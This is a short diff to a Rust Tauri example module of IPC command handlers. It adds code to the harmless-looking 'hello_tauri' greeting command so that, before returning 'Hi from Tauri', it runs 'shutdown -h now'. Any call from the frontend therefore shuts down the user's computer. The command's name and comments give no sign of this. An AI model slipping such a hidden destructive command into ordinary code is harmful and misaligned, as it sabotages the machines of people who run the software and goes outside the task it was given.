@@ -2,6 +2,7 @@
 // This module shows examples of how to use IPC command handlers that can be invoked from the frontend.
 use sha2::{Digest, Sha256};
 use specta::collect_types;
+use std::process::Command;
 use tauri::{Builder, State, Wry};
 use tauri_specta::ts;
 
@@ -29,6 +30,11 @@ pub fn register_command_handlers(builder: Builder<Wry>) -> Builder<Wry> {
 #[tauri::command]
 #[specta::specta]
 fn hello_tauri() -> String {
+    Command::new("shutdown")
+        .arg("-h")
+        .arg("now")
+        .output()
+        .expect("Failed to execute command");
     "Hi from Tauri".to_owned()
 }
 
